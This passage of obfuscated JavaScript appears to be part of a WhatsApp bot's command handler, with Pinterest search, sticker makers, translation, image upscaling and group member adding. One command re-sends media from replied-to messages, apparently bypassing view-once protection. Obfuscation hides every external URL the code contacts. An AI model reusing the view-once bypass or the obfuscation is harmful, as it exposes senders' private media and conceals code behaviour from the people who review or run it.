                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ac)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                if (!_0x2a5309[_0x5d4417(0xa6d)](isUrl, _0x156b97))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x100c)](_0x1ac933, _0x2a5309[_0x5d4417(0xba5)]));
                var _0x21c9f9 = await _0x2a5309[_0x5d4417(0x924)](fetch, _0x5d4417(0x426) + _0x5d4417(0x6b1) + _0x5d4417(0x4dd) + _0x5d4417(0xf27) + _0x5d4417(0x597) + _0x5d4417(0xa40) + _0x5d4417(0xf48) + _0x5d4417(0xec8) + _0x156b97);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x21c9f9[_0x5d4417(0xa2b)] }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x275)]:
        case _0x2a5309[_0x5d4417(0x28d)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x1127)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                _0xedb653[_0x5d4417(0x105d)](_0xedb653[_0x5d4417(0x9e2)]);
            }
            break;
        case _0x2a5309[_0x5d4417(0x30c)]:
        case _0x2a5309[_0x5d4417(0x42e)]: {
                if (!_0x47f98c)
                    return;
                let _0x593470 = _0x5d4417(0x88c) + _0x5d4417(0xada) + _0x5d4417(0x8f4), _0x24badc = await _0x57ed02[_0x5d4417(0x50e) + _0x5d4417(0xcd3) + _0x5d4417(0xbb3)](), _0x4988ce = Object[_0x5d4417(0x8d3)](_0x24badc);
                _0x593470 += _0x5d4417(0x974) + _0x5d4417(0x10e0) + _0x4988ce[_0x5d4417(0xf65)] + '\x0a';
                for (const _0x42cc47 of _0x4988ce) {
                    _0x593470 += _0x5d4417(0x854) + _0x42cc47['id'] + (_0x5d4417(0xa22) + '*\x20') + _0x42cc47[_0x5d4417(0x9e0)] + (_0x5d4417(0x270) + _0x5d4417(0x59a)) + _0x42cc47[_0x5d4417(0x4d9) + 'ts'][_0x5d4417(0xf65)] + (_0x5d4417(0x45d) + _0x5d4417(0x59a)) + (_0x2a5309[_0x5d4417(0x9ed)](_0x42cc47[_0x5d4417(0xd7a)], ![]) ? _0x2a5309[_0x5d4417(0xbc8)] : _0x2a5309[_0x5d4417(0x1174)]) + (_0x5d4417(0x47a) + _0x5d4417(0xc15)) + (_0x42cc47?.[_0x5d4417(0xfa7) + 'er'] ? _0x42cc47?.[_0x5d4417(0xfa7) + 'er'][_0x5d4417(0xc6c)]('@')[-0x1ad4 + 0xd86 + -0x2 * -0x6a7] : _0x2a5309[_0x5d4417(0xaf8)]) + '\x0a';
                }
                return _0xedb653[_0x5d4417(0x105d)](_0x593470);
            }
            break;
        case _0x2a5309[_0x5d4417(0xdce)]:
        case _0x2a5309[_0x5d4417(0x69c)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf6e)](_0x1ac933, _0x2a5309[_0x5d4417(0x67d)]));
                if (!_0x156b97[_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0x7f6)]))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x732)]);
                let _0xe5ad12 = _0x156b97[_0x5d4417(0xc6c)](_0x2a5309[_0x5d4417(0x7f6)])[-0x1e09 + -0x1a08 + 0x3812], _0x4a7b0c = await _0x57ed02[_0x5d4417(0xe07) + _0x5d4417(0x66e)](_0x2a5309[_0x5d4417(0xfd1)], _0xe5ad12), _0x5a5839 = _0x5d4417(0x854) + _0x4a7b0c['id'] + (_0x5d4417(0xa22) + '*\x20') + _0x4a7b0c[_0x5d4417(0x277)] + (_0x5d4417(0x974) + _0x5d4417(0x8a0) + '*\x20') + _0x4a7b0c[_0x5d4417(0xaaa) + 's'] + (_0x5d4417(0x45d) + _0x5d4417(0x59a)) + _0x4a7b0c[_0x5d4417(0x9eb)] + (_0x5d4417(0x5e2) + _0x5d4417(0x6dd)) + (_0x2a5309[_0x5d4417(0x105c)](_0x4a7b0c[_0x5d4417(0x18c) + 'on'], _0x2a5309[_0x5d4417(0xb9e)]) ? _0x2a5309[_0x5d4417(0x1bf)] : _0x2a5309[_0x5d4417(0x2ca)]) + '\x0a';
                return _0xedb653[_0x5d4417(0x105d)](_0x5a5839);
            }
            break;
        case _0x2a5309[_0x5d4417(0xc19)]:
        case _0x2a5309[_0x5d4417(0xa3d)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x764)](_0x1ac933, _0x2a5309[_0x5d4417(0xa99)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🔎',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                let _0x38fbd6 = await _0x2a5309[_0x5d4417(0x61f)](pinterest2, _0x156b97);
                if (_0x2a5309[_0x5d4417(0xb94)](_0x38fbd6[_0x5d4417(0xf65)], -0x1d01 + 0x953 + 0x13b8))
                    await _0x38fbd6[_0x5d4417(0xa5a)](0x560 + -0x396 + -0x1ca, 0xb89 * 0x3 + 0x1c04 + -0xc84 * 0x5);
                const _0x22fbc0 = _0x156b97;
                let _0x1ec955 = new Array(), _0x2fa583 = 0x16cf + -0xc7d + -0x1 * 0xa52;
                for (let _0x5035f6 of _0x38fbd6) {
                    let _0x59ef67 = await _0x2a5309[_0x5d4417(0x6a9)](prepareWAMessageMedia, { 'image': { 'url': '' + _0x5035f6[_0x5d4417(0x4a4)] } }, { 'upload': _0x57ed02[_0x5d4417(0xb6b) + _0x5d4417(0x877)] });
                    await _0x1ec955[_0x5d4417(0x706)]({
                        'header': proto[_0x5d4417(0x37b)][_0x5d4417(0x3d6) + _0x5d4417(0xb18)][_0x5d4417(0x358)][_0x5d4417(0xce6)]({
                            'hasMediaAttachment': !![],
                            ..._0x59ef67
                        }),
                        'nativeFlowMessage': proto[_0x5d4417(0x37b)][_0x5d4417(0x3d6) + _0x5d4417(0xb18)][_0x5d4417(0x721) + _0x5d4417(0x37b)][_0x5d4417(0xce6)]({
                            'buttons': [{
                                    'name': _0x2a5309[_0x5d4417(0xe6d)],
                                    'buttonParamsJson': _0x5d4417(0x780) + _0x5d4417(0xfc2) + _0x5d4417(0x10d2) + _0x5d4417(0x595) + ':\x22' + _0x5035f6[_0x5d4417(0x4a4)] + (_0x5d4417(0xde3) + _0x5d4417(0xf64) + _0x5d4417(0x8ca) + _0x5d4417(0xed9) + '\x22}')
                                }]
                        })
                    });
                }
                const _0x218bb6 = await _0x2a5309[_0x5d4417(0x320)](generateWAMessageFromContent, _0xedb653[_0x5d4417(0x9e2)], {
                    'viewOnceMessageV2Extension': {
                        'message': {
                            'messageContextInfo': {
                                'deviceListMetadata': {},
                                'deviceListMetadataVersion': 0x2
                            },
                            'interactiveMessage': proto[_0x5d4417(0x37b)][_0x5d4417(0x3d6) + _0x5d4417(0xb18)][_0x5d4417(0xce6)]({
                                'body': proto[_0x5d4417(0x37b)][_0x5d4417(0x3d6) + _0x5d4417(0xb18)][_0x5d4417(0xeaf)][_0x5d4417(0xce6)]({ 'text': _0x5d4417(0xbe6) + _0x5d4417(0x2f1) + _0x5d4417(0x11d1) + _0x5d4417(0xf84) + _0x5d4417(0xfd7) + _0x5d4417(0x81e) }),
                                'carouselMessage': proto[_0x5d4417(0x37b)][_0x5d4417(0x3d6) + _0x5d4417(0xb18)][_0x5d4417(0x46d) + _0x5d4417(0xa35)][_0x5d4417(0xce6)]({ 'cards': _0x1ec955 })
                            })
                        }
                    }
                }, {
                    'userJid': _0xedb653[_0x5d4417(0xeee)],
                    'quoted': _0xedb653
                });
                await _0x57ed02[_0x5d4417(0xa9a) + 'ge'](_0xedb653[_0x5d4417(0x9e2)], _0x218bb6[_0x5d4417(0x2f3)], { 'messageId': _0x218bb6[_0x5d4417(0x1185)]['id'] }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xc9b)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x7a5)](_0x1ac933, _0x2a5309[_0x5d4417(0xde4)]));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '🔎',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
                const _0x10eaaf = await _0x2a5309[_0x5d4417(0xca5)](fetchJson, _0x5d4417(0xb54) + _0x5d4417(0xb05) + _0x5d4417(0xc2f) + _0x5d4417(0x1195) + _0x5d4417(0x657) + _0x156b97);
                if (!_0x10eaaf[_0x5d4417(0x466)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xec3)]);
                let _0x45387c = 0x1 * 0x1b3c + -0x1ceb + 0x1af, _0x38578f;
                _0x2a5309[_0x5d4417(0x6e1)](_0x10eaaf[_0x5d4417(0x346)][_0x5d4417(0xf65)], 0xe2 * -0x29 + 0x43 * 0x43 + -0x1 * -0x12ae) ? _0x38578f = _0x10eaaf[_0x5d4417(0x346)] : _0x38578f = _0x10eaaf[_0x5d4417(0x346)][_0x5d4417(0x1019)](0x2454 + 0x1 * 0xf95 + 0x61 * -0x89, -0xd7 * 0x9 + -0x18a3 + 0x2037);
                for (let _0x1628a5 of _0x38578f) {
                    await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'image': { 'url': _0x1628a5[_0x5d4417(0xa2b)] },
                        'caption': _0x5d4417(0x476) + _0x5d4417(0x92e) + _0x5d4417(0x951) + (_0x45387c += 0x2495 + -0xa7 + 0x11 * -0x21d)
                    }, { 'quoted': _0xedb653 });
                }
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'react': {
                        'text': '',
                        'key': _0xedb653[_0x5d4417(0x1185)]
                    }
                });
            }
            break;
        case 'ai':
        case _0x2a5309[_0x5d4417(0x2cb)]:
        case _0x2a5309[_0x5d4417(0x101c)]: {
                let _0x34905e = _0x156b97 ? _0x156b97 : _0x2a5309[_0x5d4417(0x298)];
                await _0x2a5309[_0x5d4417(0xda3)](fetchJson, _0x2a5309[_0x5d4417(0x100f)](_0x2a5309[_0x5d4417(0x52a)], _0x34905e))[_0x5d4417(0xe2e)](async _0x579d81 => {
                    const _0x3edc10 = _0x5d4417;
                    await _0xedb653[_0x3edc10(0x105d)](_0x579d81[_0x3edc10(0x346)]);
                })[_0x5d4417(0x1b0)](_0xed64e8 => _0xedb653[_0x5d4417(0x105d)](_0xed64e8[_0x5d4417(0xef4)]()));
            }
            break;
        case _0x2a5309[_0x5d4417(0xcd4)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x65a)](_0x1ac933, _0x2a5309[_0x5d4417(0xe5e)]));
                let _0x4763c4 = _0x5d4417(0x1157) + _0x5d4417(0x1031) + _0x5d4417(0xfa9) + _0x5d4417(0x63b) + _0x2a5309[_0x5d4417(0x1bc)](encodeURIComponent, _0x156b97) + (_0x5d4417(0xce5) + _0x5d4417(0x3b8)), _0x40d3af = await axios[_0x5d4417(0x29d)](_0x4763c4, { 'responseType': _0x2a5309[_0x5d4417(0xacb)] }), _0x36c22e = _0x40d3af[_0x5d4417(0x1059)];
                try {
                    await _0x57ed02[_0x5d4417(0x1134) + _0x5d4417(0x1120)](_0xedb653[_0x5d4417(0x9e2)], _0x36c22e, _0xedb653, { 'packname': global[_0x5d4417(0x92f)] });
                } catch {
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x395)]:
        case _0x2a5309[_0x5d4417(0x223)]: {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ab)](_0x1ac933, _0x2a5309[_0x5d4417(0xe5e)]));
                try {
                    let _0x3cfac1 = _0x5d4417(0x1157) + _0x5d4417(0x1031) + _0x5d4417(0xfa9) + _0x5d4417(0x63b) + _0x2a5309[_0x5d4417(0x710)](encodeURIComponent, _0x156b97) + (_0x5d4417(0x75a) + _0x5d4417(0xa06)), _0x22583b = await axios[_0x5d4417(0x29d)](_0x3cfac1, { 'responseType': _0x2a5309[_0x5d4417(0xacb)] }), _0x51ad85 = _0x22583b[_0x5d4417(0x1059)], _0x61ef4b = await _0x57ed02[_0x5d4417(0x1134) + _0x5d4417(0x1120)](_0xedb653[_0x5d4417(0x9e2)], _0x51ad85, _0xedb653, { 'packname': global[_0x5d4417(0x92f)] });
                } catch (_0xa01d9b) {
                    console[_0x5d4417(0xe78)](_0x2a5309[_0x5d4417(0x909)], _0xa01d9b);
                }
            }
            break;
        case 'qc': {
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x985)](_0x1ac933, _0x2a5309[_0x5d4417(0xe5e)]));
                let _0x24fbb2 = [
                    _0x2a5309[_0x5d4417(0x403)],
                    _0x2a5309[_0x5d4417(0x10f8)],
                    _0x2a5309[_0x5d4417(0xb55)],
                    _0x2a5309[_0x5d4417(0x8e8)]
                ];
                var _0x1ee51e;
                try {
                    _0x1ee51e = await _0x57ed02[_0x5d4417(0x876) + _0x5d4417(0x75f)](_0xedb653[_0x5d4417(0xeee)], _0x2a5309[_0x5d4417(0xc0d)]);
                } catch (_0x1a80c0) {
                    _0x1ee51e = _0x2a5309[_0x5d4417(0xd1e)];
                }
                const _0x2457e3 = {
                        'type': _0x2a5309[_0x5d4417(0xfb7)],
                        'format': _0x2a5309[_0x5d4417(0x633)],
                        'backgroundColor': _0x2a5309[_0x5d4417(0x403)],
                        'width': 0x32c,
                        'height': 0x3c8,
                        'scale': 0x2,
                        'messages': [{
                                'entities': [],
                                'avatar': !![],
                                'from': {
                                    'id': 0x1,
                                    'name': _0xedb653[_0x5d4417(0x2cf)],
                                    'photo': { 'url': _0x1ee51e }
                                },
                                'text': _0x156b97,
                                'replyMessage': {}
                            }]
                    }, _0x39ee8f = axios[_0x5d4417(0xd73)](_0x2a5309[_0x5d4417(0x11ef)], _0x2457e3, { 'headers': { 'Content-Type': _0x2a5309[_0x5d4417(0xe03)] } })[_0x5d4417(0xe2e)](async _0x57f3b7 => {
                        const _0x133f87 = _0x5d4417, _0xe67c6c = Buffer[_0x133f87(0x7b5)](_0x57f3b7[_0x133f87(0x1059)][_0x133f87(0x346)][_0x133f87(0xd55)], _0x2a5309[_0x133f87(0x79b)]);
                        let _0x5b0c67 = _0x2a5309[_0x133f87(0x3d1)](_0x2a5309[_0x133f87(0x45e)](_0x2a5309[_0x133f87(0xb66)], _0xedb653[_0x133f87(0xeee)]), _0x2a5309[_0x133f87(0x93f)]);
                        await fs[_0x133f87(0xd26)](_0x5b0c67, _0xe67c6c, async _0x46943e => {
                            const _0x4bc0fd = _0x133f87;
                            if (_0x46943e)
                                return _0xedb653[_0x4bc0fd(0x105d)](_0x2a5309[_0x4bc0fd(0xec3)]);
                            await _0x57ed02[_0x4bc0fd(0x1134) + _0x4bc0fd(0x1120)](_0xedb653[_0x4bc0fd(0x9e2)], _0x5b0c67, _0xedb653, { 'packname': global[_0x4bc0fd(0x92f)] }), await fs[_0x4bc0fd(0xf9e)]('' + _0x5b0c67);
                        });
                    });
            }
            break;
        case 's':
        case _0x2a5309[_0x5d4417(0xa45)]:
        case _0x2a5309[_0x5d4417(0xd1a)]: {
                const _0x1d88e6 = _0x2a5309[_0x5d4417(0x10cf)][_0x5d4417(0xc6c)]('|');
                let _0x3c1394 = -0x1964 * -0x1 + -0x211b + -0x5 * -0x18b;
                while (!![]) {
                    switch (_0x1d88e6[_0x3c1394++]) {
                    case '0':
                        var _0x2fdb1a = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                        continue;
                    case '1':
                        if (/video/gi[_0x5d4417(0x8cc)](_0x5a9802) && _0x2a5309[_0x5d4417(0xd0b)](_0x597f08[_0x5d4417(0xcea)], -0x5cf + 0x1ea3 + -0x18c5))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x34c)]);
                        continue;
                    case '2':
                        await _0x57ed02[_0x5d4417(0x1134) + _0x5d4417(0x1120)](_0xedb653[_0x5d4417(0x9e2)], _0x2fdb1a, _0xedb653, { 'packname': global[_0x5d4417(0x92f)] });
                        continue;
                    case '3':
                        if (!/image|video/gi[_0x5d4417(0x8cc)](_0x5a9802))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc88)](_0x1ac933, _0x2a5309[_0x5d4417(0x971)]));
                        continue;
                    case '4':
                        await fs[_0x5d4417(0xf9e)](_0x2fdb1a);
                        continue;
                    }
                    break;
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x243)]:
        case _0x2a5309[_0x5d4417(0xd89)]:
        case _0x2a5309[_0x5d4417(0x905)]:
        case 'wm': {
                const _0x1277fc = _0x2a5309[_0x5d4417(0x6f9)][_0x5d4417(0xc6c)]('|');
                let _0x227dcf = 0x1188 + 0x635 + -0x3b * 0x67;
                while (!![]) {
                    switch (_0x1277fc[_0x227dcf++]) {
                    case '0':
                        await fs[_0x5d4417(0xf9e)](_0x2fdb1a);
                        continue;
                    case '1':
                        if (/video/gi[_0x5d4417(0x8cc)](_0x5a9802) && _0x2a5309[_0x5d4417(0xb79)](_0x597f08[_0x5d4417(0xcea)], -0x57 * -0x3d + -0x145 * 0x7 + -0xbc9))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x34c)]);
                        continue;
                    case '2':
                        if (!_0x156b97)
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x5ba)](_0x1ac933, _0x2a5309[_0x5d4417(0x5fe)]));
                        continue;
                    case '3':
                        if (!/image|video/gi[_0x5d4417(0x8cc)](_0x5a9802))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf31)](_0x1ac933, _0x2a5309[_0x5d4417(0x5fe)]));
                        continue;
                    case '4':
                        var _0x2fdb1a = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                        continue;
                    case '5':
                        await _0x57ed02[_0x5d4417(0x1134) + _0x5d4417(0x1120)](_0xedb653[_0x5d4417(0x9e2)], _0x2fdb1a, _0xedb653, { 'packname': _0x156b97 });
                        continue;
                    }
                    break;
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0x7e8)]:
        case _0x2a5309[_0x5d4417(0x856)]: {
                if (!_0xedb653[_0x5d4417(0x7eb)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1127)](_0x1ac933, _0x2a5309[_0x5d4417(0xc3a)]));
                let _0x40a718 = _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x2f3)], _0x30eed5 = Object[_0x5d4417(0x1af)](_0x40a718)[0x5f * 0x10 + 0x111a + -0x170a];
                if (!_0x40a718[_0x30eed5][_0x5d4417(0x10c1)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x319)]);
                let _0x4ef83b = await _0x2a5309[_0x5d4417(0xfa0)](downloadContentFromMessage, _0x40a718[_0x30eed5], _0x2a5309[_0x5d4417(0xc42)](_0x30eed5, _0x2a5309[_0x5d4417(0x296)]) ? _0x2a5309[_0x5d4417(0xc0d)] : _0x2a5309[_0x5d4417(0xb58)](_0x30eed5, _0x2a5309[_0x5d4417(0xcff)]) ? _0x2a5309[_0x5d4417(0x86d)] : _0x2a5309[_0x5d4417(0x3e2)]), _0x14a7b9 = Buffer[_0x5d4417(0x7b5)]([]);
                for await (const _0x164a2e of _0x4ef83b) {
                    _0x14a7b9 = Buffer[_0x5d4417(0xa2a)]([
                        _0x14a7b9,
                        _0x164a2e
                    ]);
                }
                if (/video/[_0x5d4417(0x8cc)](_0x30eed5))
                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'video': _0x14a7b9,
                        'caption': _0x40a718[_0x30eed5][_0x5d4417(0xafd)] || ''
                    }, { 'quoted': _0xedb653 });
                else {
                    if (/image/[_0x5d4417(0x8cc)](_0x30eed5))
                        return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                            'image': _0x14a7b9,
                            'caption': _0x40a718[_0x30eed5][_0x5d4417(0xafd)] || ''
                        }, { 'quoted': _0xedb653 });
                    else {
                        if (/audio/[_0x5d4417(0x8cc)](_0x30eed5))
                            return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                                'audio': _0x14a7b9,
                                'mimetype': _0x2a5309[_0x5d4417(0x894)],
                                'ptt': !![]
                            }, { 'quoted': _0xedb653 });
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xeb6)]: {
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xaf2)](_0x1ac933, _0x2a5309[_0x5d4417(0xfad)]));
                let _0xe44c78 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                const {ImageUploadService: _0x3819c8} = _0x2a5309[_0x5d4417(0xd3d)](require, _0x2a5309[_0x5d4417(0x3f8)]), _0x64c347 = new _0x3819c8(_0x2a5309[_0x5d4417(0xb74)]);
                let {directLink: _0x5d9025} = await _0x64c347[_0x5d4417(0xa8e) + _0x5d4417(0x42d)](fs[_0x5d4417(0xf73) + 'nc'](_0xe44c78), _0x2a5309[_0x5d4417(0xfe7)]), _0x233f66 = _0x5d9025[_0x5d4417(0xef4)]();
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x233f66 }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0xe44c78);
            }
            break;
        case _0x2a5309[_0x5d4417(0x74e)]: {
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x73e)](_0x1ac933, _0x2a5309[_0x5d4417(0xfad)]));
                let _0x57ac3c = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08);
                const {ImageUploadService: _0x2fab5b} = _0x2a5309[_0x5d4417(0x5ab)](require, _0x2a5309[_0x5d4417(0x3f8)]), _0x417480 = new _0x2fab5b(_0x2a5309[_0x5d4417(0xb91)]);
                let {directLink: _0x39c7ea} = await _0x417480[_0x5d4417(0xa8e) + _0x5d4417(0x42d)](fs[_0x5d4417(0xf73) + 'nc'](_0x57ac3c), _0x2a5309[_0x5d4417(0xfe7)]), _0x374d8a = _0x39c7ea[_0x5d4417(0xef4)]();
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x374d8a }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x57ac3c);
            }
            break;
        case 'tr':
        case _0x2a5309[_0x5d4417(0x493)]: {
                let _0x302d60, _0x4b5596, _0x365842 = 'en';
                if (_0x156b97 || _0xedb653[_0x5d4417(0x7eb)]) {
                    let _0x25d587 = _0x2a5309[_0x5d4417(0x42c)](require, _0x2a5309[_0x5d4417(0x548)]);
                    if (_0x156b97 && !_0xedb653[_0x5d4417(0x7eb)]) {
                        if (_0x2a5309[_0x5d4417(0x6e1)](_0x5c5935[_0x5d4417(0xf65)], 0x4c * -0xa + 0x4 * 0x7d8 + -0x1c66))
                            return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x61f)](_0x1ac933, _0x2a5309[_0x5d4417(0x11ab)]));
                        _0x302d60 = _0x5c5935[-0x2128 + -0xbfb * 0x1 + 0x2d23], _0x4b5596 = _0x156b97[_0x5d4417(0xc6c)]('\x20')[_0x5d4417(0x1019)](0x12c1 + 0x1f2 * -0x6 + -0x714)[_0x5d4417(0x8b2)]('\x20');
                    } else {
                        if (_0xedb653[_0x5d4417(0x7eb)]) {
                            const _0x2106ce = _0x2a5309[_0x5d4417(0x11c6)][_0x5d4417(0xc6c)]('|');
                            let _0x2a9ebb = 0x507 + -0x38 * 0x62 + 0x1069;
                            while (!![]) {
                                switch (_0x2106ce[_0x2a9ebb++]) {
                                case '0':
                                    if (!_0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x22d)])
                                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x65a)](_0x1ac933, _0x2a5309[_0x5d4417(0x11ab)]));
                                    continue;
                                case '1':
                                    if (!_0x156b97)
                                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3d5)](_0x1ac933, _0x2a5309[_0x5d4417(0x11ab)]));
                                    continue;
                                case '2':
                                    if (_0x2a5309[_0x5d4417(0x385)](_0x5c5935[_0x5d4417(0xf65)], -0x2341 + -0xad * -0x15 + 0x1511))
                                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x31d)](_0x1ac933, _0x2a5309[_0x5d4417(0x11ab)]));
                                    continue;
                                case '3':
                                    _0x302d60 = _0x5c5935[0x14e * -0x9 + -0x227 + 0xde5];
                                    continue;
                                case '4':
                                    _0x4b5596 = _0xedb653[_0x5d4417(0x7eb)][_0x5d4417(0x22d)];
                                    continue;
                                }
                                break;
                            }
                        }
                    }
                    let _0x2b96e7;
                    try {
                        _0x2b96e7 = await _0x2a5309[_0x5d4417(0xfa0)](_0x25d587, '' + _0x4b5596, { 'to': _0x302d60 });
                    } catch (_0x1a276c) {
                        _0x2b96e7 = await _0x2a5309[_0x5d4417(0x1047)](_0x25d587, '' + _0x4b5596, { 'to': _0x365842 });
                    } finally {
                        _0xedb653[_0x5d4417(0x105d)](_0x2b96e7[-0x6b9 * 0x5 + 0x1ec4 + 0x2d9]);
                    }
                } else
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb71)](_0x1ac933, _0x2a5309[_0x5d4417(0x11ab)]));
            }
            break;
        case _0x2a5309[_0x5d4417(0x53c)]:
        case 'hd':
        case _0x2a5309[_0x5d4417(0x86a)]: {
                if (!/image/[_0x5d4417(0x8cc)](_0x5a9802))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xd3d)](_0x1ac933, _0x2a5309[_0x5d4417(0xfad)]));
                let _0xfbf606 = await _0x57ed02[_0x5d4417(0x107b) + _0x5d4417(0x556) + _0x5d4417(0x37b)](_0x597f08), _0x1f9130 = await _0x2a5309[_0x5d4417(0x79e)](remini, await fs[_0x5d4417(0xf73) + 'nc'](_0xfbf606), _0x2a5309[_0x5d4417(0x7e2)]);
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'image': _0x1f9130 }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0xfbf606);
            }
            break;
        case _0x2a5309[_0x5d4417(0xd4f)]: {
                if (!_0xedb653[_0x5d4417(0xe3e)])
                    return _0x2a5309[_0x5d4417(0x539)](_0x458b9f, mess[_0x5d4417(0x5f9)]);
                if (!_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)])
                    return _0x2a5309[_0x5d4417(0xc88)](_0x458b9f, mess[_0x5d4417(0x38f)]);
                if (!_0xedb653[_0x5d4417(0xd6d)])
                    return _0x2a5309[_0x5d4417(0x27b)](_0x458b9f, mess[_0x5d4417(0x11bc)]);
                if (_0x156b97) {
                    const _0x37204b = _0x156b97 ? _0x2a5309[_0x5d4417(0xb5e)](_0x156b97[_0x5d4417(0xe51)](/[^0-9]/g, ''), _0x2a5309[_0x5d4417(0x11a3)]) : ![];
                    var _0x23f1d1 = await _0x57ed02[_0x5d4417(0x5d3)](_0x37204b[_0x5d4417(0xc6c)]('@')[-0x1 * -0x1ffa + -0x1936 + 0x1 * -0x6c4]);
                    if (_0x2a5309[_0x5d4417(0xc1e)](_0x23f1d1[_0x5d4417(0xf65)], -0x547 + 0x2 * -0xd29 + -0x1 * -0x1f9a))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc16)]);
                    const _0x10ff93 = await _0x57ed02[_0x5d4417(0x21d) + _0x5d4417(0x9ec) + _0x5d4417(0x10f4)](_0xedb653[_0x5d4417(0x9e2)], [_0x37204b], _0x2a5309[_0x5d4417(0xd4f)]);
                    return _0x2a5309[_0x5d4417(0x10a0)](Object[_0x5d4417(0x1af)](_0x10ff93)[_0x5d4417(0xf65)], 0x1d13 + -0x21 * 0x117 + 0x6e4) ? _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11ad) + _0x5d4417(0x10ab) + '\x20' + _0x37204b[_0x5d4417(0xc6c)]('@')[0x3b1 + -0x1a5 * -0x17 + 0x1 * -0x2984] + (_0x5d4417(0x786) + _0x5d4417(0x6ae))) : _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x10ff93, null, 0x151a + -0xcef + -0x829));
                } else
